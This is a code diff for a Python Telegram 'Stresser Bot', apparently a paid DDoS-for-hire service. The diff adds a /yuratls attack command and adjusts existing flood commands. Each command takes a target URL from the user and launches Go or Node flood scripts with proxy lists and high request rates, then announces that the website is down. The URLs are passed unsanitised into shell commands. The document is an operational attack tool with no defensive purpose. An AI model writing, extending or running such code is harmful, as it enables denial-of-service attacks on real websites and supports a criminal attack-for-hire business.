@@ -56,10 +56,10 @@ def perform_tls(message):
 def handle_yuravvip(message):
     # Verifikasi pengguna VIP
     if message.from_user.id in vvip_users:
-        global is_tls_running
-        if not is_tls_running:
+        global is_yuravvip_running
+        if not is_yuravvip_running:
             msg = bot.send_message(message.chat.id, "Send url of target:")
-            bot.register_next_step_handler(msg, perform_tls)
+            bot.register_next_step_handler(msg, perform_yuravvip)
         else:
             bot.reply_to(message, "Yura-vvip Attack Sent!!!.")
 
@@ -68,7 +68,7 @@ def perform_yuravvip(message):
     url = message.text
     bot.send_message(message.chat.id, "Attack Sent!!!")
     is_yuravvip_running = True
-    os.system("go run YURA.go -site {url} -data GET")
+    os.system("go run YURA.go " + url + " GET")
     time.sleep(20)  # Tunggu selama 20 detik
     is_yuravvip_running = False
     bot.send_message(message.chat.id, "Attack Stopped Mother Fucker The Website is Down")
@@ -165,15 +165,42 @@ def perform_ddg(message):
     os.system("node DDG_BYPASS.js " + url + " 60 95500 p.txt 512")
     time.sleep(60)  # Tunggu selama 60 detik
     is_ddg_running = False
-    bot.send_message(message.chat.id, "Attack Stopped Mother Fucker The Website is Down.") 
+    bot.send_message(message.chat.id, "Attack Stopped Mother Fucker The Website is Down.")
+
+# Menangani perintah /haha
+@bot.message_handler(commands=['yuratls'])
+def handle_yuratls(message):
+    # Verifikasi pengguna VVIP
+    if message.from_user.id in vvip_users:
+        global is_yuratls_running
+        if not is_yuratls_running:
+            msg = bot.send_message(message.chat.id, "Send url of target:")
+            bot.register_next_step_handler(msg, perform_yuratls)
+        else:
+            bot.reply_to(message, "Wait process.......")
+    else:
+        bot.reply_to(message, "You don't have access to this feature. If you want to buy access, please contact @fengzzt.")
+
+def perform_yuratls(message):
+    global is_yuratls_running
+    url = message.text
+    bot.send_message(message.chat.id, "Attack Sent!!!")
+    is_yuratls_running = True
+    os.system("node yuratls.js {url} 300 150000 p.txt")
+    time.sleep(20)  # Tunggu selama 20 detik
+    is_yuravvip_running = False
+    bot.send_message(message.chat.id, "Attack Stopped Mother Fucker The Website is Down")
+ 
 
 # Menangani perintah /stopall
 @bot.message_handler(commands=['stopall'])
 def handle_stopall(message):
-    global is_tls_running, is_freeflood_running, is_ddg_running
+    global is_tls_running, is_freeflood_running, is_ddg_running, is_yuratls_running, is_yuravvip_running
     is_tls_running = False
     is_freeflood_running = False
     is_ddg_running = False
+    is_yuratls_running = False
+    is_yuravvip_running = False
     os.system("killall node")
     bot.send_message(message.chat.id, "All attacks have been stopped.")
 
@@ -181,7 +208,7 @@ def handle_stopall(message):
 @bot.message_handler(commands=['start'])
 def handle_message(message):
     if message.from_user.id in vvip_users:
-        bot.reply_to(message, "Hello! Welcome to Stresser Bot. You are a VVIP user.")
+        bot.reply_to(message, "Hello! Welcome to Stresser Bot. You are a not VVIP user.")
     else:
         bot.reply_to(message, "Hello! Welcome to Stresser Bot. Buy VVIP plan at @fengzzt")
         
@@ -191,7 +218,7 @@ def author (message):
   
 @bot.message_handler(commands=['help'])
 def help (message):
-    bot.send_message(message.chat.id, "/freeflood for noob plan/free\n/tls for tls attack (warning: high power)\n/DDG for VVIP plans\n/yuravvip for the best attack\nNote: Don't attack go.id or gov.in websites!!!")
+    bot.send_message(message.chat.id, "/freeflood for noob plan/free\n/tls for tls attack (warning: high power)\n/DDG for VVIP plans\n/yuravvip for the best attack\nNote: Don't attack .gov websites!!!")
 
 # Menjalankan bot
 bot.polling()
